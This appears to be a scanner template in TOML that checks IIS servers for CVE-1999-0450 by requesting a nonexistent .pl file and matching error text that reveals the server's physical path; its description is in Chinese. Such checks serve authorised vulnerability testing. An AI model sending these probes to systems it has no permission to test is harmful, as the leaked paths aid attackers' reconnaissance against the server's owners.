[info]
author = "AVE"
description = "通过向 IIS 服务器请求一个不存在的 .pl 文件，perl.exe 处理请求后返回的错误信息中会泄露 Web 服务器的真实物理路径，攻击者可据此获取敏感信息。"
id = "POC-AVE-1999-0688"
name = "Microsoft IIS perl.exe HTTP Path Disclosure PoC"
severity = "high"
tags = ["cve-1999-0450"]
vuln_id = [
    "CVE-1999-0450",
    "AVE-1999-0688",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nonexistent.pl"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "物理路径",
    "Physical Path",
    'C:\',
    'D:\',
    'E:\',
    "/usr/",
    "/var/",
    "/home/",
    "Directory",
    "cannot find",
    "Can't locate",
]
